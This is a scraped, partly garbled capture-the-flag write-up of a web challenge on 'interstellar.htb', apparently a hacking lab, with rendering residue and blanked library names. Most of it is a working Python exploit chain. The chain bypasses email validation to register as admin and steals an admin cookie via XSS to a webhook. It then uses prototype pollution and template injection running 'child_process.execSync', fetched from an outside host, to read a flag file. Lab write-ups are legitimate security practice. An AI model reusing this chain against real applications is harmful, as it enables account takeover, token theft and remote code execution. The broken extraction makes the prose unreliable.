description: This appears similar to Armaxis, except I finally get to send email to multiple recipients?

children.value: This appears similar to Armaxis, except I finally get to send email to multiple recipients?
The first step is to register, however we only have the email address

children.value: 'Registration is not allowed for this email domain'

children.value: But they are symbols and doesn't survive
The goal is to produce two different email address when using the two different libraries.
So I read through the source code of
I found the control characters from the source files of
was a bit hard to read but ig since it also supported the
syntax, the control characters might be of use.
I actually tried manually fuzzing for quite a while but eventually gave up.

props.className: language-js shiki shiki-themes one-light one-dark-pro monokai

children.value: After a while I got this.
Let's build on it a little bit more and simplify the payload.
This is a rather interesting payload!

props.code:
email = f"u{random.randint(100, 1000)}@interstellar.htb"
email = f'<(<test@email.htb>)y{random.randint(100, 1000)}@interstellar.htb>'
print(requests.post(target + "/api/register", json={
    "email": email,
    "password": "password",
    "role": "admin"
}).text)
requests.get(f"{emailt}/deleteall")
print(requests.post(f"{target}/api/sendEmail", json={"email": email}).text)
sleep(0.5)
code = re.findall(r"Your verification code is: ([a-f0-9]+)", requests.get(emailt).text)[0]
print("code", code)
print(requests.post(f"{target}/api/verify", json={"email": email, "code": code}).text)
token = requests.post(f"{target}/api/login", json={"email": email, "password": "password"}).json()['token']
props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
language-json shiki shiki-themes one-light one-dark-pro monokai

children.value: Yay, we can now simply register ourselves as an admin and login.
I believe this has something to do with XSS.
The first attack vector I found was this,

props.className: language-js shiki shiki-themes one-light one-dark-pro monokai

props.code: print(s.put(f"{target}/api/bounties/{b['id']}", json={ "description": "" }).text) stop, wait = webhook(1337) print(s.get(f"{target}/api/report/{b['id']}").text) data = wait() stop() admin_token = data['auth']
props.className: language-python shiki shiki-themes one-light one-dark-pro monokai

children.value: But I already have a admin token, so what's the point?
Maybe I had an unintended solution?
Spent a lot of time trying to read the file
itself seems uncapable of reading local files, so even if an redirect worked needle won't give me any flags.
While looking around I found that the
function is again, susceptible to prototype pollution.
However after I pollute the prototype server will stop functioning (unable to run previous steps of register + login etc).
Then, I realized this option in

props.className: language-python shiki shiki-themes one-light one-dark-pro monokai

children.value: Now I just need template injection!

props.className: language-html shiki shiki-themes one-light one-dark-pro monokai

children.value: Now, to activate the payload, we simply visit the target page directly,
has been overwritten, which means we will now see the flag.
The last step of prototype pollution + template injection took me so long to find, was on the edge of giving up.
In the end it was worth it, loved the challenge.

props.code:
import re import random from time import sleep import requests from server import serve_file, webhook target = "http://94.237.55.109:44276" emailt = "http://94.237.55.109:59902" # register, verify, login as admin using email bypass email = f"u{random.randint(100, 1000)}@interstellar.htb" email = f'<()y{random.randint(100, 1000)}@interstellar.htb>' print(requests.post(target + "/api/register", json={ "email": email, "password": "password", "role": "admin" }).text) requests.get(f"{emailt}/deleteall") print(requests.post(f"{target}/api/sendEmail", json={"email": email}).text) sleep(0.5) code = re.findall(r"Your verification code is: ([a-f0-9]+)", requests.get(emailt).text)[0] print(requests.post(f"{target}/api/verify", json={"email": email, "code": code}).text) token = requests.post(f"{target}/api/login", json={"email": email, "password": "password"}).json()['token'] print("token", token) s = requests.Session() s.cookies.set("auth", token) # useless xss b = s.post(f"{target}/api/bounties", json={"status": "approved", "target_name": "test", "description": "hello"}).json()['data'] print(s.put(f"{target}/api/bounties/{b['id']}", json={ "description": "" }).text) stop, wait = webhook(1337) print(s.get(f"{target}/api/report/{b['id']}").text) data = wait() stop() admin_token = data['auth'] print("admin_token", admin_token) # prototype pollution print(s.put(f"{target}/api/bounties/{b['id']}", json={ "__proto__": {"output": "/app/views/index.html"}, "description": "hello" }).text) # template injection payload payload = """

hello

{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /flag.txt')")()}} """ stop = serve_file(payload.encode(), 1337, "text/html") print(s.post(f"{target}/api/transmit", json={"url": f"https://1337.yun.ng"}).text) stop() print() print(s.get(target).text)
props.className: language-python shiki shiki-themes one-light one-dark-pro monokai
